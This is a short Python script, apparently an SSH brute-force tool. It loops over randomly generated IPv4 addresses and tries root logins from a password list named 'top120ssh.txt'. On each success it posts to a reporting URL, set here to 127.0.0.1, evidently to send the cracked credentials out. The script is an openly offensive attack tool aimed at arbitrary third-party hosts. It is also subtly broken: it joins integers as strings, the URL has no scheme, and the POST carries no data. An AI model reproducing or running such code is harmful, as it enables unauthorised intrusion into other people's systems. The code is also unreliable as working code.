#!/usr/bin/python3.6
#-*-coding:utf-8-*-

import random
import requests
from pexpect import pxssh
from threading import Thread

URL   = '127.0.0.1' # Requests
FILE  = 'top120ssh.txt' # Requests
Found = False
Words = [i for i in range(10)]

def randomTarget():

    l = []
    for i in range(4):
        if i != 3:
            l.append(random.randint(0, 255))
        else:
            l.append(random.randint(1, 255))
    return '.'.join(l)

def sshCr4cker(i, P, U='root', p=22):

    s = pxssh.pxssh()
    try:
        s.login(i, U, P, port=p)
        return U, P, i, p
    except:
        return None

def main():

    while True:

        U = 'root'
        P = open(FILE, 'r')
        i = randomTarget()
        p = 22
        for x in P.readlines():
            x = x.rstrip('\r').rstrip('\n')
            cr4ck = sshCr4cker(i, x, U=U, p=p)
            if cr4ck:
                U, P, i, p = cr4ck
                r = requests.post(URL, )
                break
        P.close()

if __name__ == '__main__':
    main()